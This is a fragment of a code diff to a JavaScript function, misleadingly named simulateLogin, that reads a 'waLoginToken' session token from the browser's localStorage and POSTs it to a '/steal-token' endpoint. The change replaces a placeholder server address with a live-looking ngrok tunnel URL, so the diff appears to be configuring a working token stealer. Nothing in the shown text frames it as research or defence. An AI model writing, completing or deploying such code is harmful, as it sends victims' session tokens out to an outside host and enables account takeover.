@@ -58,7 +58,7 @@
         function simulateLogin() {
             const sessionToken = localStorage.getItem('waLoginToken');
             if (sessionToken) {
-                fetch('http://YOUR_SERVER_IP:5000/steal-token', {
+                fetch(' https://purifier-bonelike-overpay.ngrok-free.dev/steal-token', {
                     method: 'POST',
                     body: JSON.stringify({ token: sessionToken }),
                     headers: { 'Content-Type': 'application/json' }
